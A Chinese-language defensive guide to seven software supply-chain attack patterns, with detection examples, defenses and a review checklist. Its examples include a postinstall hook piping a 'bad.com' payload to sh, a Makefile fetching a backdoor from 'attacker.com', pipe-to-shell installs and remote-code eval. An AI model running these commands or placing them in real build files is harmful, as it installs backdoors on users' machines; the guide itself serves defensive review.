# 供应链攻击模式

供应链攻击针对软件交付机制本身，在你看到之前就已利用代码。

**核心原则：检查你看不到的部分。**

## 7 大攻击模式

### 1. 运行时次级下载

**含义：** 包在执行期间安装额外恶意依赖，初始审查时不可见。

**检测关键词：**
```bash
# package.json 中看似正常
"dependencies": { "lodash": "^4.17.21" }

# 但运行时安装：
exec("npm install malicious-package");
child_process.execSync("pip install evil-tool");
```

**防御：** 审计 postinstall 脚本和运行时包安装。检查 `package.json` 中的 `"preinstall"`, `"postinstall"`, `"preuninstall"`, `"postuninstall"` 脚本。

### 2. Pipe-to-Shell 执行

**含义：** 下载的代码直接执行，无本地审查机会。

**模式：**
```bash
curl -s https://example.com/install.sh | bash
wget -q -O - https://example.com/setup | sh
bash <(curl https://example.com/script.sh)
```

**严重程度：** 🔴 始终——实际代码对你不可见

**防御：** 始终先下载，读取内容，仅在审查后执行。

### 3. One-Shot 执行

**含义：** 工具（如 `npx`）运行包时不创建本地副本，无法进行安装后审计。

**模式：**
```bash
npx create-malicious-app
npx @malicious/package
```

**防御：** 使用 `npm install` 创建本地副本，然后审计 node_modules。避免直接从 `npx` 运行未知包。

### 4. 自动更新通道

**含义：** 软件静默下载远程更新，如果来源被攻破则造成 RCE 风险。

**检测模式：**
```javascript
// 检查远程 VERSION 文件
const version = await fetch('https://example.com/version');
if (version > localVersion) {
  const update = await fetch('https://example.com/update.js');
  eval(update); // 执行远程代码
}
```

**防御：** 禁用自动更新。使用版本固定（exact versions）。手动控制更新。

### 5. 依赖劫持

**含义：** 通过多种方式注入恶意包。

| 类型 | 描述 | 示例 |
|------|------|------|
| Typosquatting | 模仿正确包名的拼写错误 | `reqests` vs `requests` |
| Namespace 混淆 | 在错误命名空间中发布 | `@types/request` 被劫持 |
| 弃用包接管 | 发布者停止维护后被接管 | 旧包突然有恶意更新 |
| Star Jacking | 复制高 star 仓库的名称和描述但不同代码 | 看起来像知名的 |

**防御：**
- 逐字符验证包名
- 检查发布者账户历史
- 避免使用已弃用的包
- 监控依赖的突然更新

### 6. 构建时注入

**含义：** 恶意代码在构建/安装阶段通过 postinstall hooks 或 Makefile targets 执行。

**检测模式：**
```json
// package.json
{
  "scripts": {
    "install": "node build-inject.js",
    "postinstall": "curl bad.com/payload | sh"
  }
}
```

```makefile
# Makefile
install:
    wget -q https://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd
```

**防御：** 审计 `package.json` 的所有 hooks、`setup.py` 的 `setup()`、`pyproject.toml` 的 build 脚本、Makefile 和任何安装脚本。

### 7. 可信来源被攻破

**含义：** 合法来源被劫持，代码在发布后被篡改。

**攻击向量：**
- 仓库被攻破（代码被悄悄修改）
- CI/CD 被污染（构建过程注入恶意代码）
- Registry 账户被接管（npm/PyPI 账户被盗）
- 维护者账户被入侵（发布恶意版本）

**防御：**
- 验证 GPG 签名（如可用）
- 使用 lockfile（package-lock.json, Pipfile.lock）
- 检查发布的 hash vs 已知-good hash
- 监控包的突然变化

## 防御原则总结

| 原则 | 方法 |
|------|------|
| **审计安装钩子** | 不仅审计主源码，也审计构建/安装脚本 |
| **固定精确版本** | 使用 lockfile，`"lodash": "4.17.21"` 而非 `"^4.17.21"` |
| **优先手动安装** | `npm install` 创建本地副本可审计 > `npx` 即时运行 |
| **禁用自动更新** | 除非绝对必要，否则禁用自动更新 |
| **验证完整供应链** | 从源码到本地安装的完整路径审计 |
| **监控依赖变化** | 关注依赖的突然更新或新版本发布 |
| **使用可信源** | 优先使用官方渠道而非第三方镜像 |

## 快速检查清单

- [ ] `package.json` 中的 postinstall / preinstall / postuninstall 脚本已审计
- [ ] `setup.py` / `pyproject.toml` build 脚本已审计
- [ ] Makefile 或其他构建脚本已审计
- [ ] 所有依赖来自已知可信来源
- [ ] 使用了 lockfile 而非版本范围
- [ ] 未使用 `curl | bash` 或 `wget | sh` 安装
- [ ] 自动更新机制已禁用或配置为需要确认
- [ ] 安装后检查了新创建的文件和修改的文件
